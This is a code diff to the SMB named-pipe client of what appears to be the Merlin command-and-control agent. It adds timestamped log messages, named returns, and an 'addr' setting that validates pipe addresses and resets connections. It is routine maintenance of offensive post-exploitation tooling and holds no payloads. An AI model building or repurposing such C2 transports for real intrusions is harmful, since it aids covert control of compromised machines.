@@ -404,7 +404,7 @@ func (client *Client) Connect() (err error) {
 			err = fmt.Errorf("clients/smb.Connect(): there was an error connecting to %s: %s", client.address, err)
 			return
 		}
-		cli.Message(cli.NOTE, fmt.Sprintf("Successfully connected to %s", client.address))
+		cli.Message(cli.SUCCESS, fmt.Sprintf("Successfully connected to %s at %s", client.address, time.Now().UTC().Format(time.RFC3339)))
 		client.connected <- true
 		err = nil
 		return
@@ -494,12 +494,13 @@ func (client *Client) Listen() (returnMessages []messages.Base, err error) {
 				// If the connection is empty and this is a REVERSE agent, wait here until the connection is established
 				cli.Message(cli.INFO, fmt.Sprintf("Waiting for a client connection before listening for messages at %s", time.Now().UTC().Format(time.RFC3339)))
 				<-client.connected
+				cli.Message(cli.SUCCESS, fmt.Sprintf("Client connection re-esablished at %s", time.Now().UTC().Format(time.RFC3339)))
 			}
 		}
 	}
 
 	// Wait for the response
-	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s at %s...", client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s on %s at %s...", client.connection.RemoteAddr(), client.connection.LocalAddr(), time.Now().UTC().Format(time.RFC3339)))
 
 	var n int
 	var tag uint32
@@ -658,7 +659,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	outData = append(outData, delegateBytes.Bytes()...)
 	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Send(): Added Tag: %d and Length: %d to data size of %d\n", tag, uint64(delegateBytes.Len()), len(outData)))
 
-	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s at %s", messages.String(m.Type), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s from %s at %s", messages.String(m.Type), client.connection.RemoteAddr(), client.connection.LocalAddr(), time.Now().UTC().Format(time.RFC3339)))
 
 	// Write the message
 	cli.Message(cli.DEBUG, fmt.Sprintf("Writing message size: %d to: %s", delegateBytes.Len(), client.connection.RemoteAddr()))
@@ -707,25 +708,67 @@ func (client *Client) SendAndWait(m messages.Base) (returnMessages []messages.Ba
 }
 
 // Get is a generic function that is used to retrieve the value of a Client's field
-func (client *Client) Get(key string) string {
-	cli.Message(cli.DEBUG, "Entering into clients/smb.Get()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
+func (client *Client) Get(key string) (value string) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Get(): entering into function with key: %s", key))
+	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Get(): leaving function with value: %s", value))
 	switch strings.ToLower(key) {
+	case "ja3":
+		return ""
 	case "paddingmax":
-		return strconv.Itoa(client.paddingMax)
+		value = strconv.Itoa(client.paddingMax)
 	case "protocol":
-		return client.String()
+		value = client.String()
 	default:
-		return fmt.Sprintf("unknown client configuration setting: %s", key)
+		value = fmt.Sprintf("unknown client configuration setting: %s", key)
 	}
+	return
 }
 
 // Set is a generic function that is used to modify a Client's field values
-func (client *Client) Set(key string, value string) error {
-	cli.Message(cli.DEBUG, "Entering into clients/smb.Set()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
-	var err error
+func (client *Client) Set(key string, value string) (err error) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Set(): entering into function with key: %s, value: %s", key, value))
+	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/smb.Set(): exiting function with err: %v", err))
+	client.Lock()
+	defer client.Unlock()
+
 	switch strings.ToLower(key) {
+	case "addr":
+		// Validate the address
+		// \\.\pipe\MerlinPipe
+		t := strings.Split(value, "\\")
+		if len(t) < 5 {
+			err = fmt.Errorf("clients/smb.Set(): invalid SMB address: %s\n Try \\\\.\\pipe\\merlin", value)
+			return
+		}
+		if t[1] != "." {
+			_, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:445", t[1]))
+			if err != nil {
+				err = fmt.Errorf("clients/smb.Set(): there was an error validating the input network address: %s", err)
+				return
+			}
+		}
+
+		if err != nil {
+			err = fmt.Errorf("clients/tcp.Set(): there was an error parsing the provide address %s : %s", value, err)
+			return
+		}
+		// Close the connection
+		err = client.connection.Close()
+		if err != nil {
+			err = fmt.Errorf("clients/tcp.Set(): there was an error closing the connection: %s", err)
+			return
+		}
+		client.connection = nil
+		if client.mode == BIND {
+			// Close the listener
+			err = client.listener.Close()
+			if err != nil {
+				err = fmt.Errorf("clients/tcp.Set(): there was an error closing the listener: %s", err)
+				return
+			}
+		}
+		client.listener = nil
+		client.address = value
 	case "listener":
 		var id uuid.UUID
 		id, err = uuid.FromString(value)
@@ -740,7 +783,7 @@ func (client *Client) Set(key string, value string) error {
 	default:
 		err = fmt.Errorf("unknown tcp client setting: %s", key)
 	}
-	return err
+	return
 }
 
 // String returns the type of SMB client
